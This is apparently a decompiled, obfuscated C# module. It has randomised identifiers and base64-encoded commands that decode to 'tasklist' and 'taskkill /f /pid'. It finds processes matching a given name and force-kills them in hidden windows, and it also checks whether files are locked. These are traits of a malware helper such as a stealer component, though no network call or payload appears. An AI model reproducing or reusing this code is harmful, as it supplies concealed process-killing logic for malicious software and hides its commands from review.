using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace kuMeqwHpurUBOD;

internal class mNZEakGpRFrLn
{
	private sealed class KtffYLihbrpxs
	{
		public string ZfcguNctObUX;

		public bool _003CKillproc_003Eb__4(string string_0)
		{
			return string_0.Contains(ZfcguNctObUX);
		}
	}

	public static readonly List<string> sqqqjEjibBtar = new List<string>();

	public static readonly List<string> EInyfdxiIcyqdTZ = new List<string>();

	private static Func<string, string[]> CS_0024_003C_003E9__CachedAnonymousMethodDelegate8;

	private static Func<string[], string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate9;

	public static bool BzymlTUToS(string string_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void yMPBlYJpSCfxjv(string string_0)
	{
		KtffYLihbrpxs CS_0024_003C_003E8__locals0 = new KtffYLihbrpxs();
		CS_0024_003C_003E8__locals0.ZfcguNctObUX = string_0;
		try
		{
			string text = JkzVSkHlMea(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza2xpc3Q="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			IEnumerable<string> source2 = source.Where((string string_0) => string_0.Contains(CS_0024_003C_003E8__locals0.ZfcguNctObUX));
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 = (string string_0) => string_0.Split(new char[1] { ',' });
			}
			IEnumerable<string[]> source3 = source2.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate8);
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 = (string[] string_0) => string_0[1].Replace("\"", "");
			}
			List<string> list = source3.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate9).ToList();
			foreach (string item in list)
			{
				JkzVSkHlMea(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza2tpbGw="), BErRpdYOfQAwSr.oMKRHTBqYRfOk("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string JkzVSkHlMea(string string_0, string string_1)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0, string_1);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}

	private static string[] _003CKillproc_003Eb__5(string string_0)
	{
		return string_0.Split(new char[1] { ',' });
	}

	private static string _003CKillproc_003Eb__6(string[] string_0)
	{
		return string_0[1].Replace("\"", "");
	}
}
